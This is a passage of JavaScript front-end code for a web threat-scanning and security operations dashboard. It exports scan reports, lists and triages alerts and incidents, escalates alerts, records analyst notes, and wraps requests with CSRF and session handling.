---------------------------------
- Scripts Detected:          ${scriptsEl ? scriptsEl.textContent : "N/A"}
- External Resources:        ${extResEl ? extResEl.textContent : "N/A"}
- Forms Count:               ${formsEl ? formsEl.textContent : "N/A"}
- Hidden Elements:           ${hiddenEl ? hiddenEl.textContent : "N/A"}
- Iframes:                   ${iframesEl ? iframesEl.textContent : "N/A"}
- Password Fields:           ${passEl ? passEl.textContent : "N/A"}
- Suspicious Event Handlers: ${handlersEl ? handlersEl.textContent : "N/A"}
- DOM Payload Size:          ${payloadEl ? payloadEl.textContent : "N/A"}
- Observed Vocabulary:       ${keywordsEl ? keywordsEl.textContent : "None"}

THREAT SCORE CONTRIBUTIONS
--------------------------
${contributionsSection}

FINDINGS & REMEDIATION ACTIONS
------------------------------
${findingsSection}

Note:
This analysis is based on context-aware static HTML inspection and reputation checks.
No scripts were executed in the scanning sandbox.

Generated on: ${new Date().toLocaleString()}
`;

  const blob = new Blob([reportText], { type: "text/plain;charset=utf-8" });
  const link = document.createElement("a");
  const blobUrl = URL.createObjectURL(blob);
  link.href = blobUrl;
  link.download = "web_threat_scan_report.txt";
  link.click();
  setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
}

function renderHistory() {
  const history = JSON.parse(sessionStorage.getItem("scanHistory")) || [];
  const list = document.getElementById("historyList");
  const box = document.querySelector(".history");

  if (!list || !box) return;

  if (!history.length) {
    box.style.display = "none";
    return;
  }

  box.style.display = "block";
  list.innerHTML = "";
  history.forEach(h => {
    const li = document.createElement("li");
    li.textContent = `${h.time} | ${h.target} | ${h.verdict || h.severity}`;
    list.appendChild(li);
  });
}

// ==========================================================================
// PHASE 2: ENTERPRISE SOC ALERT & INCIDENT MANAGEMENT JAVASCRIPT
// ==========================================================================

let socAlertsCurrentPage = 1;
let socAlertsTotalPages = 1;
let currentActiveAlert = null;
let alertSearchDebounce = null;

let socIncidentsCurrentPage = 1;
let socIncidentsTotalPages = 1;
let currentActiveIncident = null;
let incidentSearchDebounce = null;

// ================= 1. SOC STATISTICS FETCHERS =================
async function fetchSocAlertStats() {
  try {
    const res = await socFetch(`${API_BASE}/api/soc/alerts/stats`);
    if (!res.ok) return;
    const json = await res.json();
    if (!json.success || !json.data) return;

    const stats = json.data;

    // Badges & Counters
    const alertBadge = document.getElementById("alertsBadgeCount");
    if (alertBadge) alertBadge.innerText = stats.totalAlerts || 0;

    const dashOpen = document.getElementById("dashOpenAlertsCount");
    if (dashOpen) dashOpen.innerText = (stats.byStatus?.NEW || 0) + (stats.byStatus?.IN_TRIAGE || 0);

    const dashP1 = document.getElementById("dashP1AlertsCount");
    if (dashP1) dashP1.innerText = stats.byPriority?.P1_CRITICAL || 0;

    // View KPIs
    const kpiTotal = document.getElementById("kpiTotalAlerts");
    if (kpiTotal) kpiTotal.innerText = stats.totalAlerts || 0;

    const kpiP1 = document.getElementById("kpiP1Alerts");
    if (kpiP1) kpiP1.innerText = stats.byPriority?.P1_CRITICAL || 0;

    const kpiP2 = document.getElementById("kpiP2Alerts");
    if (kpiP2) kpiP2.innerText = stats.byPriority?.P2_HIGH || 0;

    const kpiNew = document.getElementById("kpiNewAlerts");
    if (kpiNew) kpiNew.innerText = stats.byStatus?.NEW || 0;

  } catch (err) {
    console.warn("[SOC Alerts] Stats fetch error:", err.message);
  }
}

async function fetchSocIncidentStats() {
  try {
    const res = await socFetch(`${API_BASE}/api/soc/incidents/stats`);
    if (!res.ok) return;
    const json = await res.json();
    if (!json.success || !json.data) return;

    const stats = json.data;

    // Badges & Dashboard KPIs
    const incBadge = document.getElementById("incidentsBadgeCount");
    if (incBadge) incBadge.innerText = stats.activeIncidents || 0;

    const dashActive = document.getElementById("dashActiveIncidentsCount");
    if (dashActive) dashActive.innerText = stats.activeIncidents || 0;

    const dashResolved = document.getElementById("dashResolvedIncidentsCount");
    if (dashResolved) dashResolved.innerText = stats.byStatus?.RESOLVED || 0;

    // View KPIs
    const kpiActive = document.getElementById("kpiActiveIncidents");
    if (kpiActive) kpiActive.innerText = stats.activeIncidents || 0;

    const kpiCritical = document.getElementById("kpiCriticalIncidents");
    if (kpiCritical) kpiCritical.innerText = stats.bySeverity?.CRITICAL || 0;

    const kpiResolved = document.getElementById("kpiResolvedIncidents");
    if (kpiResolved) kpiResolved.innerText = stats.byStatus?.RESOLVED || 0;

    const kpiTotal = document.getElementById("kpiTotalIncidents");
    if (kpiTotal) kpiTotal.innerText = stats.totalIncidents || 0;

  } catch (err) {
    console.warn("[SOC Incidents] Stats fetch error:", err.message);
  }
}

// ================= 2. ALERTS LIST & FILTERING =================
function handleAlertSearch() {
  clearTimeout(alertSearchDebounce);
  alertSearchDebounce = setTimeout(() => {
    fetchSocAlerts(1);
  }, 300);
}

function changeAlertsPage(delta) {
  const newPage = socAlertsCurrentPage + delta;
  if (newPage >= 1 && newPage <= socAlertsTotalPages) {
    fetchSocAlerts(newPage);
  }
}

async function fetchSocAlerts(page = 1) {
  socAlertsCurrentPage = page;
  const tbody = document.getElementById("alertsTableBody");
  const emptyState = document.getElementById("alertsEmptyState");
  const paginationInfo = document.getElementById("alertsPaginationInfo");
  const prevBtn = document.getElementById("alertsPrevBtn");
  const nextBtn = document.getElementById("alertsNextBtn");

  const searchInput = document.getElementById("alertSearchInput")?.value.trim() || "";
  const severity = document.getElementById("alertSeverityFilter")?.value || "";
  const priority = document.getElementById("alertPriorityFilter")?.value || "";
  const status = document.getElementById("alertStatusFilter")?.value || "";

  const params = new URLSearchParams({
    page: String(page),
    limit: "15"
  });

  if (searchInput) params.append("target", searchInput);
  if (severity) params.append("severity", severity);
  if (priority) params.append("priority", priority);
  if (status) params.append("status", status);

  try {
    const res = await socFetch(`${API_BASE}/api/soc/alerts?${params.toString()}`);
    if (!res.ok) throw new Error("Failed to load alerts");
    const json = await res.json();

    const alerts = json.data || [];
    const pagination = json.pagination || { totalPages: 1, total: 0 };
    socAlertsTotalPages = pagination.totalPages || 1;

    if (paginationInfo) {
      paginationInfo.innerText = `Showing page ${page} of ${socAlertsTotalPages} (${pagination.total} alerts)`;
    }
    if (prevBtn) prevBtn.disabled = page <= 1;
    if (nextBtn) nextBtn.disabled = page >= socAlertsTotalPages;

    if (!alerts.length) {
      if (tbody) tbody.innerHTML = "";
      if (emptyState) emptyState.style.display = "block";
      return;
    }

    if (emptyState) emptyState.style.display = "none";
    if (tbody) {
      tbody.innerHTML = alerts.map(a => {
        const prioClass = (a.priority || "P3_MEDIUM").toLowerCase().replace(/[^a-z0-9]/g, "_");
        const statusClass = (a.status || "NEW").toLowerCase();
        const dateStr = a.createdAt ? new Date(a.createdAt).toLocaleString() : "--";
        const incidentLink = a.incidentId
          ? `<button class="btn btn-sm btn-outline" style="padding:2px 8px; font-size:11px;" onclick="openIncidentModal('${escapeHtml(a.incidentId)}')"><i data-lucide="shield-alert" class="icon-12"></i> ${escapeHtml(a.incidentId.slice(0, 10))}...</button>`
          : `<span class="soc-date-cell">Unlinked</span>`;

        return `
          <tr>
            <td>
              <div style="font-weight:600; color:var(--text-main); font-size:13px;">${escapeHtml(a.title)}</div>
              <div class="soc-date-cell">${escapeHtml(a.alertId)} &bull; ${dateStr}</div>
            </td>
            <td>
              <div class="soc-target-cell" title="${escapeHtml(a.target)}">${escapeHtml(a.target)}</div>
            </td>
            <td>
              <div style="display:flex; align-items:center; gap:6px;">
                <span class="priority-chip ${prioClass}">${escapeHtml(a.priority?.replace("_", " ") || "P3")}</span>
              </div>
            </td>
            <td>
              <span class="vector-chip">${escapeHtml(a.detectionSource || "STATIC")}</span>
            </td>
            <td>
              <span class="mono" style="font-weight:700; color:${a.riskScore >= 70 ? 'var(--color-malicious)' : a.riskScore >= 40 ? 'var(--color-suspicious)' : 'var(--color-safe)'}">${a.riskScore}/100</span>
            </td>
            <td>
              <span class="alert-status-chip ${statusClass}">${escapeHtml(a.status)}</span>
            </td>
            <td>
              ${incidentLink}
            </td>
            <td class="soc-actions-cell">
              <button class="btn btn-sm btn-primary" onclick="openAlertModal('${escapeHtml(a.alertId)}')">
                <i data-lucide="eye" class="icon-13"></i>
                <span>Triage</span>
              </button>
            </td>
          </tr>
        `;
      }).join("");
      refreshIcons();
    }

  } catch (err) {
    console.error("[SOC Alerts] Fetch error:", err);
    if (tbody) tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:20px; color:#EF4444;">Error loading alerts: ${escapeHtml(err.message)}</td></tr>`;
  }
}

// ================= 3. INCIDENTS LIST & FILTERING =================
function handleIncidentSearch() {
  clearTimeout(incidentSearchDebounce);
  incidentSearchDebounce = setTimeout(() => {
    fetchSocIncidents(1);
  }, 300);
}

function changeIncidentsPage(delta) {
  const newPage = socIncidentsCurrentPage + delta;
  if (newPage >= 1 && newPage <= socIncidentsTotalPages) {
    fetchSocIncidents(newPage);
  }
}

async function fetchSocIncidents(page = 1) {
  socIncidentsCurrentPage = page;
  const tbody = document.getElementById("incidentsTableBody");
  const emptyState = document.getElementById("incidentsEmptyState");
  const paginationInfo = document.getElementById("incidentsPaginationInfo");
  const prevBtn = document.getElementById("incidentsPrevBtn");
  const nextBtn = document.getElementById("incidentsNextBtn");

  const searchInput = document.getElementById("incidentSearchInput")?.value.trim() || "";
  const status = document.getElementById("incidentStatusFilter")?.value || "";
  const severity = document.getElementById("incidentSeverityFilter")?.value || "";
  const vector = document.getElementById("incidentVectorFilter")?.value || "";

  const params = new URLSearchParams({
    page: String(page),
    limit: "15"
  });

  if (searchInput) params.append("target", searchInput);
  if (status) params.append("status", status);
  if (severity) params.append("severity", severity);
  if (vector) params.append("attackVector", vector);

  try {
    const res = await socFetch(`${API_BASE}/api/soc/incidents?${params.toString()}`);
    if (!res.ok) throw new Error("Failed to load incidents");
    const json = await res.json();

    const incidents = json.data || [];
    const pagination = json.pagination || { totalPages: 1, total: 0 };
    socIncidentsTotalPages = pagination.totalPages || 1;

    if (paginationInfo) {
      paginationInfo.innerText = `Showing page ${page} of ${socIncidentsTotalPages} (${pagination.total} incidents)`;
    }
    if (prevBtn) prevBtn.disabled = page <= 1;
    if (nextBtn) nextBtn.disabled = page >= socIncidentsTotalPages;

    if (!incidents.length) {
      if (tbody) tbody.innerHTML = "";
      if (emptyState) emptyState.style.display = "block";
      return;
    }

    if (emptyState) emptyState.style.display = "none";
    if (tbody) {
      tbody.innerHTML = incidents.map(inc => {
        const statusClass = (inc.status || "OPEN").toLowerCase();
        const prioClass = (inc.priority || "P3_MEDIUM").toLowerCase().replace(/[^a-z0-9]/g, "_");
        const dateStr = inc.updatedAt ? new Date(inc.updatedAt).toLocaleString() : "--";
        const targets = Array.isArray(inc.affectedTargets) ? inc.affectedTargets : [];
        const targetsDisplay = targets.length > 0
          ? `${escapeHtml(targets[0])}${targets.length > 1 ? ` (+${targets.length - 1} more)` : ''}`
          : "N/A";
        const alertCount = Array.isArray(inc.associatedAlertIds) ? inc.associatedAlertIds.length : 0;

        return `
          <tr>
            <td>
              <div style="font-weight:600; color:var(--text-main); font-size:13px;">${escapeHtml(inc.title)}</div>
              <div class="soc-date-cell">${escapeHtml(inc.incidentId)}</div>
            </td>
            <td>
              <span class="incident-status-chip ${statusClass}">${escapeHtml(inc.status)}</span>
            </td>
            <td>
              <span class="priority-chip ${prioClass}">${escapeHtml(inc.severity)}</span>
            </td>
            <td>
              <span class="vector-chip">${escapeHtml(inc.attackVector || "UNKNOWN")}</span>
            </td>
            <td>
              <div class="soc-target-cell" title="${escapeHtml(targets.join(', '))}">${targetsDisplay}</div>
            </td>
            <td>
              <span class="mono" style="font-weight:700;">${alertCount}</span>
            </td>
            <td>
              <span class="soc-date-cell">${escapeHtml(inc.assignedTo || "Unassigned")}</span>
            </td>
            <td>
              <span class="soc-date-cell">${dateStr}</span>
            </td>
            <td class="soc-actions-cell">
              <button class="btn btn-sm btn-primary" onclick="openIncidentModal('${escapeHtml(inc.incidentId)}')">
                <i data-lucide="shield" class="icon-13"></i>
                <span>Investigate</span>
              </button>
            </td>
          </tr>
        `;
      }).join("");
      refreshIcons();
    }

  } catch (err) {
    console.error("[SOC Incidents] Fetch error:", err);
    if (tbody) tbody.innerHTML = `<tr><td colspan="9" style="text-align:center; padding:20px; color:#EF4444;">Error loading incidents: ${escapeHtml(err.message)}</td></tr>`;
  }
}

// ================= 4. ALERT DETAILS MODAL =================
async function openAlertModal(alertId) {
  if (!alertId) return;
  const modal = document.getElementById("alertDetailsModal");
  if (!modal) return;

  try {
    const res = await socFetch(`${API_BASE}/api/soc/alerts/${encodeURIComponent(alertId)}`);
    if (!res.ok) throw new Error("Alert not found");
    const json = await res.json();
    const alert = json.data;
    currentActiveAlert = alert;

    document.getElementById("alertModalTitle").innerText = alert.title || "Alert Details";
    document.getElementById("alertModalId").innerText = alert.alertId || alertId;
    document.getElementById("alertModalTarget").innerText = alert.target || "--";
    document.getElementById("alertModalSource").innerText = alert.detectionSource || "STATIC";

    const prioClass = (alert.priority || "P3_MEDIUM").toLowerCase().replace(/[^a-z0-9]/g, "_");
    document.getElementById("alertModalSeverityBadge").innerHTML = `
      <span class="priority-chip ${prioClass}">${escapeHtml(alert.severity)} &bull; ${escapeHtml(alert.priority?.replace("_", " "))}</span>
    `;

    document.getElementById("alertModalScore").innerHTML = `
      <span class="mono" style="font-weight:700;">${alert.riskScore}/100</span> &bull; 
      <span style="font-weight:700; color:${alert.verdict === 'MALICIOUS' ? '#EF4444' : alert.verdict === 'SUSPICIOUS' ? '#F59E0B' : '#10B981'}">${escapeHtml(alert.verdict)}</span>
    `;

    const incLinkBox = document.getElementById("alertModalIncidentLink");
    if (incLinkBox) {
      if (alert.incidentId) {
        incLinkBox.innerHTML = `
          <button class="btn btn-sm btn-primary" onclick="closeAlertModal(); openIncidentModal('${escapeHtml(alert.incidentId)}')">
            <i data-lucide="shield-alert" class="icon-14"></i>
            <span>View Incident ${escapeHtml(alert.incidentId)}</span>
          </button>
        `;
      } else {
        incLinkBox.innerHTML = `<span class="soc-date-cell">No incident linked &mdash; Standalone Alert</span>`;
      }
    }

    const evList = document.getElementById("alertModalEvidenceList");
    if (evList) {
      const items = Array.isArray(alert.evidence) ? alert.evidence : [];
      if (!items.length) {
        evList.innerHTML = `<div class="soc-date-cell">No specific threat evidence objects stored.</div>`;
      } else {
        evList.innerHTML = items.map(e => `
          <div style="background:#0D1627; border:1px solid var(--border-card); border-radius:6px; padding:10px 12px;">
            <div style="display:flex; justify-content:space-between; align-items:center;">
              <span style="font-weight:600; font-size:12.5px; color:var(--text-main);">${escapeHtml(e.name)}</span>
              <span class="priority-chip ${e.severity === 'CRITICAL' ? 'p1_critical' : e.severity === 'HIGH' ? 'p2_high' : 'p3_medium'}">${escapeHtml(e.severity)} (+${e.scoreContribution || 0} pts)</span>
            </div>
            <div style="font-size:12px; color:var(--text-secondary); margin-top:4px;">${escapeHtml(e.explanation || "")}</div>
            ${e.evidence ? `<pre class="mono" style="background:#080D19; padding:4px 8px; border-radius:4px; font-size:11px; margin-top:6px; color:var(--primary); overflow-x:auto;">${escapeHtml(e.evidence)}</pre>` : ''}
          </div>
        `).join("");
      }
    }

    // Render analyst notes
    renderAlertModalNotes(alert.analystNotes || []);

    // Set status select
    const statusSelect = document.getElementById("alertModalStatusSelect");
    if (statusSelect) statusSelect.value = alert.status || "NEW";

    modal.classList.add("active");
    refreshIcons();

  } catch (err) {
    showSocAlert({ icon: "error", title: "Error", text: err.message });
  }
}

function renderAlertModalNotes(notes = []) {
  const box = document.getElementById("alertModalNotesList");
  if (!box) return;

  if (!notes.length) {
    box.innerHTML = `<div class="soc-date-cell">No analyst notes recorded yet.</div>`;
    return;
  }

  box.innerHTML = notes.map(n => `
    <div class="timeline-entry">
      <div class="timeline-entry-header">
        <span class="timeline-author">${escapeHtml(n.author || "Analyst")}</span>
        <span class="timeline-time">${n.timestamp ? new Date(n.timestamp).toLocaleTimeString() : ""}</span>
      </div>
      <div class="timeline-text">${escapeHtml(n.note || "")}</div>
    </div>
  `).join("");
}

function closeAlertModal() {
  const modal = document.getElementById("alertDetailsModal");
  if (modal) modal.classList.remove("active");
  currentActiveAlert = null;
}

async function updateCurrentAlertStatus() {
  if (!currentActiveAlert) return;
  const select = document.getElementById("alertModalStatusSelect");
  if (!select) return;

  const newStatus = select.value;
  try {
    const res = await socFetch(`${API_BASE}/api/soc/alerts/${encodeURIComponent(currentActiveAlert.alertId)}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: newStatus, author: "SOC Analyst" })
    });
    if (!res.ok) throw new Error("Failed to update alert status");
    const json = await res.json();
    currentActiveAlert = json.data;
    fetchSocAlerts(socAlertsCurrentPage);
    fetchSocAlertStats();
  } catch (err) {
    showSocAlert({ icon: "error", title: "Update Error", text: err.message });
  }
}

async function submitAlertNote() {
  if (!currentActiveAlert) return;
  const textInput = document.getElementById("alertNewNoteText");
  const authorInput = document.getElementById("alertNoteAuthor");
  const text = textInput ? textInput.value.trim() : "";
  const author = authorInput ? authorInput.value.trim() : "SOC Analyst";

  if (!text) return;

  try {
    const res = await socFetch(`${API_BASE}/api/soc/alerts/${encodeURIComponent(currentActiveAlert.alertId)}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ note: text, author })
    });
    if (!res.ok) throw new Error("Failed to add note");
    const json = await res.json();
    currentActiveAlert = json.data;
    if (textInput) textInput.value = "";
    renderAlertModalNotes(currentActiveAlert.analystNotes || []);
  } catch (err) {
    showSocAlert({ icon: "error", title: "Error", text: err.message });
  }
}

async function escalateCurrentAlertToIncident() {
  if (!currentActiveAlert) return;

  const confirmed = await showSocConfirm({
    title: "Escalate to Incident",
    text: `Create a dedicated security incident for alert '${currentActiveAlert.title}'?`,
    confirmText: "Escalate Now"
  });
  if (!confirmed) return;

  try {
    const res = await socFetch(`${API_BASE}/api/soc/incidents`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        title: `Incident: ${currentActiveAlert.title}`,
        description: currentActiveAlert.description || `Escalated from alert ${currentActiveAlert.alertId}.`,
        severity: currentActiveAlert.severity,
        priority: currentActiveAlert.priority,
        attackVector: "ANOMALY_UNKNOWN",
        associatedAlertIds: [currentActiveAlert.alertId],
        affectedTargets: [currentActiveAlert.target],
        investigationNotes: [
          {
            text: `Incident established manually from alert ${currentActiveAlert.alertId}.`,
            author: "SOC Analyst",
            timestamp: new Date()
          }
        ]
      })
    });

    if (!res.ok) throw new Error("Failed to create incident");
    const json = await res.json();
    const newInc = json.data;

    // Link alert to new incident
    await socFetch(`${API_BASE}/api/soc/alerts/${encodeURIComponent(currentActiveAlert.alertId)}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        incidentId: newInc.incidentId,
        status: "ESCALATED_TO_INCIDENT"
      })
    });

    closeAlertModal();
    fetchSocAlerts(socAlertsCurrentPage);
    fetchSocAlertStats();
    fetchSocIncidents(1);
    fetchSocIncidentStats();
    openIncidentModal(newInc.incidentId);

  } catch (err) {
    showSocAlert({ icon: "error", title: "Escalation Error", text: err.message });
  }
}

// ================= 5. INCIDENT INVESTIGATION MODAL =================
async function openIncidentModal(incidentId) {
  if (!incidentId) return;
  const modal = document.getElementById("incidentInvestigationModal");
  if (!modal) return;

  try {
    const res = await socFetch(`${API_BASE}/api/soc/incidents/${encodeURIComponent(incidentId)}`);
    if (!res.ok) throw new Error("Incident not found");
    const json = await res.json();
    const incident = json.data;
    currentActiveIncident = incident;

    document.getElementById("incidentModalTitle").innerText = incident.title || "Incident Investigation";
    document.getElementById("incidentModalId").innerText = incident.incidentId || incidentId;

    const statusClass = (incident.status || "OPEN").toLowerCase();
    const prioClass = (incident.priority || "P3_MEDIUM").toLowerCase().replace(/[^a-z0-9]/g, "_");
    document.getElementById("incidentModalStatusBadges").innerHTML = `
      <span class="incident-status-chip ${statusClass}">${escapeHtml(incident.status)}</span>
      <span class="priority-chip ${prioClass}">${escapeHtml(incident.severity)} &bull; ${escapeHtml(incident.priority?.replace("_", " "))}</span>
    `;

    document.getElementById("incidentModalVector").innerText = incident.attackVector || "ANOMALY_UNKNOWN";
    document.getElementById("incidentModalAssignee").innerText = incident.assignedTo || "Unassigned";

    // Targets list
    const targets = Array.isArray(incident.affectedTargets) ? incident.affectedTargets : [];
    document.getElementById("incidentModalTargetCount").innerText = targets.length;
    const targetsBox = document.getElementById("incidentModalTargetsList");
    if (targetsBox) {
      targetsBox.innerHTML = targets.length > 0
        ? targets.map(t => `<div class="soc-target-cell"><i data-lucide="globe" class="icon-12"></i> ${escapeHtml(t)}</div>`).join("")
        : `<div class="soc-date-cell">No affected targets recorded.</div>`;
    }

    // Exfiltration list
    const exfils = Array.isArray(incident.exfiltrationEndpoints) ? incident.exfiltrationEndpoints : [];
    const exfilBox = document.getElementById("incidentModalExfilList");
    if (exfilBox) {
      exfilBox.innerHTML = exfils.length > 0
        ? exfils.map(e => `<div class="mono" style="font-size:11.5px; color:#EF4444;"><i data-lucide="radio" class="icon-12"></i> ${escapeHtml(e)}</div>`).join("")
        : `<div class="soc-date-cell">None observed.</div>`;
    }

    // Remediation steps
    const rem = incident.remediation || {};
    document.getElementById("incidentRemediationSummary").innerText = rem.summary || "Review affected infrastructure and verify indicator containment.";
    const stepsBox = document.getElementById("incidentRemediationSteps");
    if (stepsBox) {
      const steps = Array.isArray(rem.steps) ? rem.steps : [];
      stepsBox.innerHTML = steps.map(s => `
        <div class="remediation-step-item">
          <i data-lucide="check-square" class="icon-14"></i>
          <span>${escapeHtml(s)}</span>
        </div>
      `).join("");
    }

    // Associated alerts
    const alerts = Array.isArray(incident.associatedAlertIds) ? incident.associatedAlertIds : [];
    document.getElementById("incidentModalAlertCount").innerText = alerts.length;
    const alertsBox = document.getElementById("incidentModalAlertsList");
    if (alertsBox) {
      alertsBox.innerHTML = alerts.length > 0
        ? alerts.map(id => `
          <div style="display:flex; align-items:center; justify-content:space-between; background:#080D19; padding:6px 10px; border-radius:5px;">
            <span class="mono" style="font-size:12px; color:var(--primary);">${escapeHtml(id)}</span>
            <button class="btn btn-sm btn-outline" style="padding:2px 6px; font-size:11px;" onclick="closeIncidentModal(); openAlertModal('${escapeHtml(id)}')">
              <i data-lucide="eye" class="icon-12"></i> View Alert
            </button>
          </div>
        `).join("")
        : `<div class="soc-date-cell">No correlated alerts.</div>`;
    }

    // Render interactive investigation notes timeline
    renderIncidentNotesTimeline(incident.investigationNotes || []);

    // Set status select
    const statusSelect = document.getElementById("incidentModalStatusSelect");
    if (statusSelect) statusSelect.value = incident.status || "OPEN";

    modal.classList.add("active");
    refreshIcons();

  } catch (err) {
    showSocAlert({ icon: "error", title: "Error", text: err.message });
  }
}

function renderIncidentNotesTimeline(notes = []) {
  const box = document.getElementById("incidentNotesTimeline");
  if (!box) return;

  if (!notes.length) {
    box.innerHTML = `<div class="soc-date-cell">No investigation notes recorded yet.</div>`;
    return;
  }

  box.innerHTML = notes.map(n => {
    const isAuto = (n.author || "").toLowerCase().includes("automation") || (n.author || "").toLowerCase().includes("correlation");
    return `
      <div class="timeline-entry ${isAuto ? 'automated' : ''}">
        <div class="timeline-entry-header">
          <span class="timeline-author">${escapeHtml(n.author || "Analyst")}</span>
          <span class="timeline-time">${n.timestamp ? new Date(n.timestamp).toLocaleString() : ""}</span>
        </div>
        <div class="timeline-text">${escapeHtml(n.text || "")}</div>
      </div>
    `;
  }).join("");
}

function closeIncidentModal() {
  const modal = document.getElementById("incidentInvestigationModal");
  if (modal) modal.classList.remove("active");
  currentActiveIncident = null;
}

async function updateCurrentIncidentStatus() {
  if (!currentActiveIncident) return;
  const select = document.getElementById("incidentModalStatusSelect");
  if (!select) return;

  const newStatus = select.value;
  try {
    const res = await socFetch(`${API_BASE}/api/soc/incidents/${encodeURIComponent(currentActiveIncident.incidentId)}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: newStatus, author: "SOC Analyst" })
    });
    if (!res.ok) throw new Error("Failed to update incident status");
    const json = await res.json();
    currentActiveIncident = json.data;
    fetchSocIncidents(socIncidentsCurrentPage);
    fetchSocIncidentStats();
    openIncidentModal(currentActiveIncident.incidentId);
  } catch (err) {
    showSocAlert({ icon: "error", title: "Update Error", text: err.message });
  }
}

async function submitIncidentNote() {
  if (!currentActiveIncident) return;
  const textInput = document.getElementById("incidentNewNoteText");
  const authorInput = document.getElementById("incidentNoteAuthor");
  const text = textInput ? textInput.value.trim() : "";
  const author = authorInput ? authorInput.value.trim() : "SOC Analyst";

  if (!text) return;

  try {
    const res = await socFetch(`${API_BASE}/api/soc/incidents/${encodeURIComponent(currentActiveIncident.incidentId)}/notes`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text, author })
    });
    if (!res.ok) throw new Error("Failed to add note");
    const json = await res.json();
    currentActiveIncident = json.data;
    if (textInput) textInput.value = "";
    renderIncidentNotesTimeline(currentActiveIncident.investigationNotes || []);
  } catch (err) {
    showSocAlert({ icon: "error", title: "Note Submission Error", text: err.message });
  }
}

// ================= 6. CREATE INCIDENT MODAL =================
function openCreateIncidentModal() {
  const modal = document.getElementById("createIncidentModal");
  if (modal) modal.classList.add("active");
}

function closeCreateIncidentModal() {
  const modal = document.getElementById("createIncidentModal");
  if (modal) modal.classList.remove("active");
}

async function submitCreateIncident() {
  const title = document.getElementById("newIncidentTitle")?.value.trim() || "";
  const severity = document.getElementById("newIncidentSeverity")?.value || "HIGH";
  const priority = document.getElementById("newIncidentPriority")?.value || "P2_HIGH";
  const attackVector = document.getElementById("newIncidentVector")?.value || "ANOMALY_UNKNOWN";
  const assignee = document.getElementById("newIncidentAssignee")?.value.trim() || "Unassigned";
  const targetsRaw = document.getElementById("newIncidentTargets")?.value.trim() || "";
  const initialNote = document.getElementById("newIncidentInitialNote")?.value.trim() || "";

  if (!title) {
    showSocAlert({ icon: "warning", title: "Title Required", text: "Please enter an incident title." });
    return;
  }

  const affectedTargets = targetsRaw
    ? targetsRaw.split(",").map(t => t.trim()).filter(Boolean)
    : [];

  const payload = {
    title,
    severity,
    priority,
    attackVector,
    assignedTo: assignee,
    affectedTargets,
    investigationNotes: initialNote ? [{ text: initialNote, author: assignee, timestamp: new Date() }] : []
  };

  try {
    const res = await socFetch(`${API_BASE}/api/soc/incidents`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!res.ok) {
      const errJson = await res.json();
      throw new Error(errJson.error || "Failed to create incident");
    }

    closeCreateIncidentModal();
    fetchSocIncidents(1);
    fetchSocIncidentStats();
    showSocAlert({ icon: "success", title: "Incident Created", text: "Security incident established successfully." });

  } catch (err) {
    showSocAlert({ icon: "error", title: "Creation Error", text: err.message });
  }
}

// ==========================================================================
// PHASE 2.5: AUTHENTICATION, RBAC, CSRF, SESSION EXPIRY & AUDIT CONSOLE
// ==========================================================================

let socCurrentUser = null;
let socCsrfToken = null;
let socSessionExpiresAt = null;
let socSessionExpiryTimer = null;

let socAuditCurrentPage = 1;
let socAuditTotalPages = 1;
let auditSearchDebounce = null;

/**
 * Authenticated fetch wrapper:
 * - Sends HttpOnly session cookies (same-origin / include)
 * - Automatically attaches X-CSRF-Token header on state-changing HTTP verbs
 * - Intercepts 401 (Session Expired / Auth Required) and opens Login Gate
 * - Intercepts 403 (RBAC Forbidden / CSRF) and notifies analyst
 */
async function socFetch(url, options = {}) {
  const method = (options.method || "GET").toUpperCase();
  const headers = { ...(options.headers || {}) };

  if (!["GET", "HEAD", "OPTIONS"].includes(method) && socCsrfToken) {
    headers["X-CSRF-Token"] = socCsrfToken;
  }

  const fetchOpts = {
    ...options,
    method,
    headers,
    credentials: API_BASE ? "include" : "same-origin"
  };

  const res = await fetch(url, fetchOpts);

  if (res.status === 401) {
    let payload = {};
    try { payload = await res.clone().json(); } catch (_) {}
    handleSessionExpired(payload.code === "SESSION_EXPIRED");
    return res;
  }

  if (res.status === 403) {
    let payload = {};
    try { payload = await res.clone().json(); } catch (_) {}
    if (payload.code === "FORBIDDEN" || payload.code === "CSRF_INVALID" || payload.code === "AUDIT_IMMUTABLE") {
      showSocAlert({
        icon: "error",
        title: "Access Denied (403)",
        text: payload.error || "Your role does not permit this operation."
      });
    }
  }

  return res;
}

function showAuthGateNotice(message, type = "error") {
  const box = document.getElementById("authGateNotice");
  if (!box) return;
  if (!message) {
    box.style.display = "none";
    box.innerText = "";
    return;
  }
  box.className = `auth-notice ${type}`;
  box.innerText = message;
  box.style.display = "block";
}

function openAuthGate({ showSetup = false, notice = "", noticeType = "error" } = {}) {
  const overlay = document.getElementById("authGateOverlay");
  const loginForm = document.getElementById("socLoginForm");
  const setupForm = document.getElementById("socSetupForm");
  const subtitle = document.getElementById("authGateSubtitle");

  if (loginForm) loginForm.style.display = showSetup ? "none" : "flex";
  if (setupForm) setupForm.style.display = showSetup ? "flex" : "none";
  if (subtitle) {
    subtitle.innerText = showSetup
      ? "First-run security initialization required"
      : "Authenticate to access Security Operations telemetry";
  }

  showAuthGateNotice(notice, noticeType);
  if (overlay) overlay.classList.add("active");
  refreshIcons();
}

function closeAuthGate() {
  const overlay = document.getElementById("authGateOverlay");
  if (overlay) overlay.classList.remove("active");
  showAuthGateNotice("");
}

function handleSessionExpired(wasExpired = true) {
  const hadSession = Boolean(socCurrentUser);
  socCurrentUser = null;
  socCsrfToken = null;
  socSessionExpiresAt = null;
  if (socSessionExpiryTimer) {
    clearInterval(socSessionExpiryTimer);
    socSessionExpiryTimer = null;
  }

  const userCard = document.getElementById("sidebarUserCard");
  if (userCard) userCard.style.display = "none";

  closeAlertModal();
  closeIncidentModal();
  closeCreateIncidentModal();
  closeCreateUserModal();

  if (hadSession || wasExpired) {
    openAuthGate({
